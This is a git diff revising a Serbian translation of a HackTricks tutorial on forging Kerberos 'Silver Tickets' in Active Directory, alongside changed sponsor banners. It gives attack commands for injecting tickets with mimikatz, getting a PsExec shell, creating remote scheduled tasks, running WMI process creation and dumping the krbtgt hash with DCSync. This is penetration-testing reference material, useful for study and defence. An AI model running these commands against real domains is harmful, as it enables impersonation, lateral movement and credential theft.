@@ -6,25 +6,25 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, kako pisanog tako i govornog_).
+**Savet za bug bounty**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Srebrna karta
 
-Napad **Srebrna karta** uključuje iskorišćavanje servisnih karata u Active Directory (AD) okruženjima. Ova metoda se oslanja na **dobijanje NTLM heša servisnog naloga**, kao što je nalog računara, kako bi se falsifikovala karta za Ticket Granting Service (TGS). Sa ovom falsifikovanom kartom, napadač može pristupiti određenim uslugama na mreži, **predstavljajući bilo kog korisnika**, obično ciljajući administrativne privilegije. Naglašava se da je korišćenje AES ključeva za falsifikovanje karata sigurnije i manje otkriveno.
+Napad **Srebrna karta** uključuje iskorišćavanje servisnih karata u okruženjima Active Directory (AD). Ova metoda se oslanja na **dobijanje NTLM heša servisnog naloga**, kao što je nalog računara, kako bi se falsifikovala karta za uslugu dodeljivanja karata (TGS). Sa ovom falsifikovanom kartom, napadač može pristupiti određenim uslugama na mreži, **predstavljajući se kao bilo koji korisnik**, obično ciljajući administrativne privilegije. Naglašava se da je korišćenje AES ključeva za falsifikovanje karata sigurnije i manje detektovano.
 
-Za izradu karata, koriste se različiti alati zasnovani na operativnom sistemu:
+Za izradu karata, koriste se različiti alati zavisno od operativnog sistema:
 
 ### Na Linux-u
 ```bash
@@ -44,49 +44,41 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS usluga je istaknuta kao čest cilj za pristupanje sistemima žrtve, ali i druge usluge poput HOST i RPCSS mogu biti iskorišćene za zadatke i WMI upite.
-
 ## Dostupne usluge
 
-| Vrsta usluge                               | Srebrne ulaznice za usluge                                                |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell udaljeno upravljanje            | <p>HOST</p><p>HTTP</p><p>Zavisno od operativnog sistema:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Ponekad možete samo zatražiti: WINRM</p> |
-| Zakazani zadaci                            | HOST                                                                       |
-| Deljenje fajlova u Windows-u, takođe i psexec            | CIFS                                                                       |
-| LDAP operacije, uključujući DCSync           | LDAP                                                                       |
-| Alati za udaljeno upravljanje Windows Serverom | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Zlatne ulaznice                             | krbtgt                                                                     |
+| Tip usluge                               | Srebrne karte usluga                                                     |
+| ---------------------------------------- | ------------------------------------------------------------------------ |
+| WMI                                      | <p>HOST</p><p>RPCSS</p>                                                |
+| PowerShell udaljeno upravljanje         | <p>HOST</p><p>HTTP</p><p>Zavisno od OS-a takođe:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                    | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete samo zatražiti: WINRM</p> |
+| Planirani zadaci                         | HOST                                                                   |
+| Deljenje datoteka u sistemu Windows, takođe psexec | CIFS                                                                   |
+| LDAP operacije, uključujući DCSync       | LDAP                                                                   |
+| Alati za udaljeno upravljanje serverom Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
+| Zlatne karte                             | krbtgt                                                                 |
 
-Koristeći **Rubeus** možete **zatražiti sve** ove ulaznice koristeći parametar:
+Korišćenjem **Rubeus**-a možete **zatražiti sve** ove karte usluga koristeći parametar:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Događaji ID-ja srebrnih ulaznica
+### Događaji ID-ova srebrnih karata
 
 * 4624: Prijava na nalog
 * 4634: Odjava sa naloga
 * 4672: Admin prijava
 
-## Zloupotreba ulaznica za usluge
+## Zloupotreba karata usluga
 
-U sledećim primerima zamislimo da je ulaznica dobijena impersoniranjem administratorskog naloga.
+U sledećim primerima zamislimo da je karta dobijena predstavljajući se kao administratorski nalog.
 
 ### CIFS
 
-Sa ovom ulaznicom možete pristupiti fasciklama `C$` i `ADMIN$` putem **SMB** (ako su izložene) i kopirati fajlove na udaljeni fajl sistem samo tako što ćete uraditi nešto poput:
+Sa ovom kartom moći ćete pristupiti fasciklama `C$` i `ADMIN$` putem **SMB** (ako su izložene) i kopirati datoteke na deo udaljenog fajl sistema samo radeći nešto poput:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Takođe ćete moći da dobijete shell unutar hosta ili izvršite proizvoljne komande koristeći **psexec**:
-
-{% content-ref url="../ntlm/psexec-and-winexec.md" %}
-[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
-{% endcontent-ref %}
-
 ### HOST
 
 Sa ovlašćenjem možete generisati zakazane zadatke na udaljenim računarima i izvršiti proizvoljne komande:
@@ -103,7 +95,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Sa ovim karticama možete **izvršiti WMI na žrtvinskom sistemu**:
+Sa ovim kartama možete **izvršiti WMI na sistemu žrtve**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -113,37 +105,32 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Pronađite **više informacija o wmiexec** na sledećoj stranici:
-
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
-{% endcontent-ref %}
-
 ### HOST + WSMAN (WINRM)
 
-Sa pristupom winrm preko računara možete **pristupiti** čak i dobiti PowerShell:
+Sa winrm pristupom preko računara možete **pristupiti** čak i dobiti PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Proverite sledeću stranicu da biste saznali **druge načine povezivanja sa udaljenim hostom pomoću winrm-a**:
+Proverite sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom pomoću winrm**:
 
 {% content-ref url="../ntlm/winrm.md" %}
 [winrm.md](../ntlm/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-Imajte na umu da **winrm mora biti aktivan i da osluškuje** na udaljenom računaru da biste mu pristupili.
+Imajte na umu da **winrm mora biti aktivan i osluškivan** na udaljenom računaru da biste mu pristupili.
 {% endhint %}
 
 ### LDAP
 
-Sa ovim privilegijama možete izvući bazu podataka DC-a koristeći **DCSync**:
+Sa ovim privilegijama možete iskopati bazu podataka DC-a koristeći **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
 **Saznajte više o DCSync** na sledećoj stranici:
 
 ## Reference
+
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
@@ -151,22 +138,22 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, pisano i govorno_).
+**Savet za bug bounty**: **Prijavite se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite AWS hakovanje od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
